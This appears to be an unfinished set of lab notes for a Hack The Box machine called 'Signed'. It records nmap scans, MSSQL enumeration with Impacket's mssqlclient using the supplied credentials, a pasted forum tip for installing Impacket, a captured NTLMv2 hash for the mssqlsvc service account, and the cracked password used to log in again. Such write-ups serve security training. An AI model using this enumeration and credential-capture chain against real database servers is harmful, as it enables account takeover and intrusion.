# Signed

IP 10.10.11.90

Nmap result:
```
└─$ nmap -sC -A 10.10.11.90 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 05:40 EDT
Nmap scan report for 10.10.11.90 (10.10.11.90)
Host is up (0.18s latency).
Not shown: 999 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.10.11.90:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2025-10-12T05:03:59
|_Not valid after:  2055-10-12T05:03:59
|_ssl-date: 2025-10-12T09:41:38+00:00; +1s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 1433/tcp)
HOP RTT       ADDRESS
1   179.09 ms 10.10.14.1 (10.10.14.1)
2   179.34 ms 10.10.11.90 (10.10.11.90)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 76.55 seconds
                                                                         
```

MACHINE INFORMATION
As is common in real life Windows penetration tests, you will start the Signed box with credentials for the following account which can be used to access the MSSQL service: scott / Sm230#C5NatH

Resource: https://www.infosecinstitute.com/resources/application-security/attacking-ms-sql-server-gain-system-access/

Resource: https://www.hackingarticles.in/mssql-for-pentesternmap/

```
└─$ nmap -p1433 --script ms-sql-ntlm-info 10.10.11.90 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 06:32 EDT
Nmap scan report for 10.10.11.90 (10.10.11.90)
Host is up (0.18s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   10.10.11.90:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763

```

```
└─$ nmap -p1433 --script ms-sql-dump-hashes --script-args mssql.username=scott,mssql.password=Sm230#C5NatH  10.10.11.90 -Pn
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-12 06:37 EDT
Nmap scan report for 10.10.11.90 (10.10.11.90)
Host is up (0.18s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-dump-hashes: 
|   10.10.11.90:1433: 
|     sa:Null
|_    scott:Null

```


br4un

Zakura
Jun 2024
Hi,
I had the same error message too. For me, it was because my VM (Pwnbox) had an old version of Impacket. Here’s how I fixed it (might not be the best way, but it did the trick for me):

#1 Create a virtual environment in your home directory
cd ~
python3 -m venv myenv

#2 Activate the virtual environment, When the virtual environment is activated, you will see (myenv) before your terminal prompt.
source ~/myenv/bin/activate

#4 Update pip in the virtual environment:
pip install --upgrade pip

#5 Install Impacket from the GitHub repository:
pip install git+https://github.com/fortra/impacket.git

#6 Verify Impacket installation:
pip show impacket

#7 Navigate to the virtual environment bin directory:
cd ~/myenv/bin

#8 Run the Impacket mssqlclient.py script:
python3 mssqlclient.py ARCHETYPE/sql_svc@{IP_target} -windows-auth

#To disable the virtual environment:
deactivate

Resource: https://linux.die.net/man/1/kinit

Installing kinit and wait...

```└─$ sudo apt install -y krb5-user ```


```
└─$ python3 mssqlclient.py scott@10.10.11.90
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Password:

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
SQL (scott  guest@master)> 
SQL (scott  guest@master)> 

```

```
┌──(myenv)─(kali㉿kali)-[~/impacket/myenv/bin]
└─$ python3 mssqlclient.py scott@10.10.11.90 -command "SELECT principal_id, name, type_desc, [type], create_date, is_disabled FROM sys.server_principals ORDER BY type_desc, name;"

Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL> SELECT principal_id, name, type_desc, [type], create_date, is_disabled FROM sys.server_principals ORDER BY type_desc, name;
principal_id   name                                  type_desc     type   create_date   is_disabled   
------------   -----------------------------------   -----------   ----   -----------   -----------   
          14   ##MS_DatabaseConnector##              SERVER_ROLE   b'R'   2020-09-04 16:00:00             0   
          15   ##MS_DatabaseManager##                SERVER_ROLE   b'R'   2020-09-04 16:00:00             0   
          13   ##MS_DefinitionReader##               SERVER_ROLE   b'R'   2019-09-04 16:00:00             0   
          16   ##MS_LoginManager##                   SERVER_ROLE   b'R'   2020-09-04 16:00:00             0   
          18   ##MS_PerformanceDefinitionReader##    SERVER_ROLE   b'R'   2021-09-04 16:00:00             0   
          17   ##MS_SecurityDefinitionReader##       SERVER_ROLE   b'R'   2020-09-04 16:00:00             0   
          20   ##MS_ServerPerformanceStateReader##   SERVER_ROLE   b'R'   2021-09-04 16:00:00             0   
          19   ##MS_ServerSecurityStateReader##      SERVER_ROLE   b'R'   2021-09-04 16:00:00             0   
          12   ##MS_ServerStateManager##             SERVER_ROLE   b'R'   2019-09-04 16:00:00             0   
          11   ##MS_ServerStateReader##              SERVER_ROLE   b'R'   2019-09-04 16:00:00             0   
          10   bulkadmin                             SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           9   dbcreator                             SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           8   diskadmin                             SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           7   processadmin                          SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           2   public                                SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           4   securityadmin                         SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           5   serveradmin                           SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           6   setupadmin                            SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           3   sysadmin                              SERVER_ROLE   b'R'   2009-04-13 12:59:06             0   
           1   sa                                    SQL_LOGIN     b'S'   2003-04-08 09:10:35             0   
```

```
└─$ python3 mssqlclient.py scott@10.10.11.90 -command "EXEC sp_linkedservers;"

Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL> EXEC sp_linkedservers;
SRV_NAME   SRV_PROVIDERNAME   SRV_PRODUCT   SRV_DATASOURCE   SRV_PROVIDERSTRING   SRV_LOCATION   SRV_CAT   
--------   ----------------   -----------   --------------   ------------------   ------------   -------   
DC01       SQLNCLI            SQL Server    DC01             NULL                 NULL           NULL      
                                                                                                                   
┌──(myenv)─(kali㉿kali)-[~/impacket/myenv/bin]
└─$ python3 mssqlclient.py scott@10.10.11.90 -command "SELECT r.name AS role_name, sp.name AS member_name FROM sys.server_role_members m JOIN sys.server_principals r ON m.role_principal_id=r.principal_id JOIN sys.server_principals sp ON m.member_principal_id=sp.principal_id WHERE r.name='sysadmin';"

Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL> SELECT r.name AS role_name, sp.name AS member_name FROM sys.server_role_members m JOIN sys.server_principals r ON m.role_principal_id=r.principal_id JOIN sys.server_principals sp ON m.member_principal_id=sp.principal_id WHERE r.name='sysadmin';
role_name   member_name   
---------   -----------   
sysadmin    sa     
```
```
└─$ python3 mssqlclient.py scott@10.10.11.90 -command "SELECT * FROM sys.servers;"

Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL> SELECT * FROM sys.servers;
server_id   name   product      provider   data_source   location   provider_string   catalog   connect_timeout   query_timeout   is_linked   is_remote_login_enabled   is_rpc_out_enabled   is_data_access_enabled   is_collation_compatible   uses_remote_collation   collation_name   lazy_schema_validation   is_system   is_publisher   is_subscriber   is_distributor   is_nonsql_subscriber   is_remote_proc_transaction_promotion_enabled   modify_date   is_rda_server   
---------   ----   ----------   --------   -----------   --------   ---------------   -------   ---------------   -------------   ---------   -----------------------   ------------------   ----------------------   -----------------------   ---------------------   --------------   ----------------------   ---------   ------------   -------------   --------------   --------------------   --------------------------------------------   -----------   -------------   
        0   DC01   SQL Server   SQLNCLI    DC01          NULL       NULL              NULL                    0               0           0                         1                    1                        0                         0                       1   NULL                                  0           0              0               0                0                      0                                              0   2025-10-02 09:27:31   
```
is_remote_login_enabled 1
is_rpc_out_enabled 1
uses_remote_collation 1

Resource: https://www.bugb.co/post/1433-pentesting-mssql-microsoft-sql-server

Resource: https://database.guide/check-if-rpc-out-is-enabled-on-a-linked-server/

```
└─$ python3 mssqlclient.py scott@10.10.11.90 -command "SELECT name from master.dbo.sysdatabases;"
Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL> SELECT name from master.dbo.sysdatabases;
name     
------   
master   
tempdb   
model    
msdb  
```

Resource: https://www.adversify.co.uk/blog/escalating-privileges-via-linked-database-servers

```
[SMB] NTLMv2-SSP Client   : 10.10.11.90
[SMB] NTLMv2-SSP Username : SIGNED\mssqlsvc
[SMB] NTLMv2-SSP Hash     : mssqlsvc::SIGNED:e33c286bb05da8b7:0E95A3F4E04FDA89F7301D8355CCA7F0:010100000000000000D7C85B9F3BDC016C18A0BD18625D8F0000000002000800460043003800430001001E00570049004E002D004200500056004C00320054004C004100380043004C0004003400570049004E002D004200500056004C00320054004C004100380043004C002E0046004300380043002E004C004F00430041004C000300140046004300380043002E004C004F00430041004C000500140046004300380043002E004C004F00430041004C000700080000D7C85B9F3BDC0106000400020000000800300030000000000000000000000000300000E1A33361626684E47EFC22BE4D92CF4B3A6120D65A64F8EE8194E63FCFEE0DBD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003200300035000000000000000000   
```

cracked: purPLE9795!@

Resource: https://habr.com/ru/companies/ruvds/articles/743444/

```
└─$ python3 mssqlclient.py 'SIGNED.HTB/mssqlsvc:purPLE9795!@'@10.10.11.90 -windows-auth -command "SELECT SUSER_SID() AS my_sid, master.sys.fn_varbintohexstr(SUSER_SID()) AS my_sid_hex, SUSER_SNAME() AS my_name;"

Impacket v0.13.0.dev0+20251002.113829.eaf2e556 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC01): Line 1: Changed database context to 'master'.
[*] INFO(DC01): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
SQL> SELECT SUSER_SID() AS my_sid, master.sys.fn_varbintohexstr(SUSER_SID()) AS my_sid_hex, SUSER_SNAME() AS my_name;
                                                     my_sid   my_sid_hex                                                   my_name           
-----------------------------------------------------------   ----------------------------------------------------------   ---------------   
b'0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000'   0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000   SIGNED\mssqlsvc 
```

Resource: